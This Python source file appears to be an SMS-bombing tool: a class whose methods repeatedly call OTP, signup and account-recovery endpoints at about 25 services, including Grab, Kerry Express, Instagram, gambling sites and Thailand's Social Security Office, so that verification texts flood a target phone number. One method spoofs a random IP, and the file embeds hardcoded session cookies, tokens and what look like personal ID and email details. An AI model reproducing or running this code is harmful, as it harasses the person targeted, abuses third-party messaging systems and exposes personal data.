from urllib import response
from httpx import Client
from socket import inet_ntoa
from struct import pack 
from random import randint


class messageAPI:
    def __init__(self, headers, phone) -> None:
        self.headers = headers
        self.phones_ = phone

        self.clients = Client(headers={"User-Agent": self.headers})

    def grab(self):
        while True:
            try:
                response = self.clients.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", json={"client_id": "4ddf78ade8324462988fec5bfc5874c2", "transaction_ctx": "null","country_code": "TH", "method": "SMS", "num_digits": "6", "scope": "openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile", "phone_number": f"66{self.phones_[1:]}"})
                print('grab', response.status_code)
                
                break
            except: pass

    def vcanbuy(self):
        while True:
            try:
                response = self.clients.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{self.phones_}")
                print('vcanbuy', response.status_code)
                break
            except: pass

    def nocnoc(self):
        while True:
            try:
                response = self.clients.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", json={"lang": "th", "userType": "BUYER", "locale": "th", "orgIdfier": "scg", "phone": f"+66{self.phones_[1:]}", "type": "signup", "otpTemplate": "buyer_signup_otp_message", "userParams": {"buyerName": "dec"}})
                print('nocnoc', response.status_code)
                break
            except: pass

    def amazon(self):
        while True:
            try:
                response = self.clients.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", headers={"cache-control": "max-age=0", "content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode", "x-amz-user-agent": "aws-amplify/0.1.x js", "referer": "https://www.bugaboo.tv/members/resetpass/phone"}, json={"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{self.phones_[1:]}"})
                print('amazon', response.status_code)
                break
            except: pass

    def the1(self):
        while True:
            try:
                response = self.clients.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on": {"value": self.phones_,"country": "66"},"type": "mobile"}, headers={"accept": "application/json, text/plain, */*", "content-type": "application/json;charset=UTF-8"})
                print('the1', response.status_code)
                break
            except: pass

    def gccircularlivingshop(self):
        while True:
            try:
                response = self.clients.post("https://gccircularlivingshop.com/sms/sendOtp",json={"grant_type": "otp", "username": f"+66{self.phones_}", "password": "", "client": "ecommerce"})
                print('gccircularlivingshop', response.status_code)
                break
            except: pass

    def lucabet168(self):
        while True:
            try:
                response = self.clients.post("https://m.lucabet168.com/api/register-otp",json={"brands_id": "609caede5a67e5001164b89d", "agent_register": "60a22f7d233d2900110070d7", "tel": self.phones_})
                print('lucabet168', response.status_code)
                break
            except: pass

    def ep789bet(self):
        while True:
            try:
                response = self.clients.post("https://ep789bet.net/auth/send_otp", data={"phone": self.phones_})
                print('ep789bet', response.status_code)
                break
            except: pass

    def p1112(self):
        while True:
            try:
                response = self.clients.post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber": self.phones_,"language": "th"}, headers={"accept": "application/json, text/plain, /"})
                print('p1112', response.status_code)
                break
            except: pass

    def konvy(self):
        while True:
            try:
                response = self.clients.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": self.phones_})
                print('konvy', response.status_code)
                break
            except: pass

    def kerryexpress(self):
        while True:
            try:
                response = self.clients.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{self.phones_}")
                print('kerryexpress', response.status_code)
                break
            except: pass

    def wongnai(self):
        while True:
            try:
                response = self.clients.post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn", data={"phoneno": self.phones_,"retrycount": "0"})
                print('wongnai', response.status_code)
                break
            except: pass

    def makroclick(self):
        while True:
            try:
                response = self.clients.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": self.phones_, "password": "1111a1111A", "name": self.phones_, "provinceCode": "74", "districtCode": "970", "subdistrictCode": "8654","zipcode": "94140", "siebelCustomerTypeId": "710", "locale": "th_TH"})
                print('makroclick', response.status_code)
                break
            except: pass

    def trueid(self):
        while True:
            try:
                response = self.clients.post("https://vaccine.trueid.net/vacc-verify/api/getotp", json={"msisdn": self.phones_, "function": "enroll"})
                print('trueid', response.status_code)
                break
            except: pass

    def truemoveh(self):
        while True:
            try:
                response = self.clients.post("https://topping.truemoveh.com/api/get_request_otp", data={"mobile_number": self.phones_})
                print('truemoveh', response.status_code)
                break
            except: pass

    def azurewebsites(self):
        while True:
            try:
                response = self.clients.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={self.phones_}&type=Register")
                print('azurewebsites', response.status_code)
                break
            except: pass

    def quickcash8(self):
        while True:
            try:
                response = self.clients.get(f"https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone={self.phones_}&img_code=", headers={"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip"})
                print('quickcash8', response.status_code)
                break
            except: pass

    def findclone(self):
        while True:
            try:
                response = self.clients.get(f"https://findclone.ru/register?phone=+66{self.phones_[1:]}")
                print('findclone', response.status_code)
                break
            except: pass

    def queenclub88(self):
        while True:
            try:
                ip_address = str(inet_ntoa(pack('>I', randint(1, 0xffffffff))))
                response = self.clients.post("https://queenclub88.com/api/register/phone",data={"phone": self.phones_, "ip": ip_address, "user_agent": self.headers})
                print('queenclub88', response.status_code)
                break
            except: pass

    def monomax(self):
        while True:
            try:
                response = self.clients.post("https://www.monomax.me/api/v2/signup/telno",json={"password": "12345678+", "telno": self.phones_})
                print('monomax', response.status_code)
                break
            except: pass

    def ufabetcash(self):
        while True:
            try:
                response = self.clients.post("https://ufa108.ufabetcash.com/v4/api/", headers={"x-requested-with": "XMLHttpRequest","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept": "*/*","referer": "https://ufa108.ufabetcash.com/register.php","cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"},data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=123&m_surname=123&m_line=123&m_bank=1&m_account_number=12345678900&m_from=40&m_phone={self.phones_}")
                print('ufabetcash', response.status_code)
                break
            except: pass

    def icq(self):
        while True:
            try:
                response = self.clients.post("https://u.icq.net/api/v70/rapi/auth/sendCode", json={"reqId":"13041-1645813013","params":{"phone":f"66{self.phones_}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
                print('icq', response.status_code)
                break
            except: pass

    def instagram(self):
        while True:
            try:
                response = self.clients.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data=f"email_or_username={self.phones_}&recaptcha_challenge_field=", headers={"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"})
                print('instagram', response.status_code)
                break
            except: pass

    def b226(self):
        while True:
            try:
                response = self.clients.post("http://b226.com/x/code", data={f"phone": self.phones_})
                print('b226', response.status_code)
                break
            except: pass

    def sso(self):
        while True:
            try:
                response = self.clients.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp', headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"}, data=f"dCard=1358231116147&Mobile={self.phones_}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")     
                print('sso', response.status_code)
                break
            except: pass


#https://ufa3bb.com/account/register
#https://vipgame66.com/signup/verify?tabIndex=0&phoneNumber=
#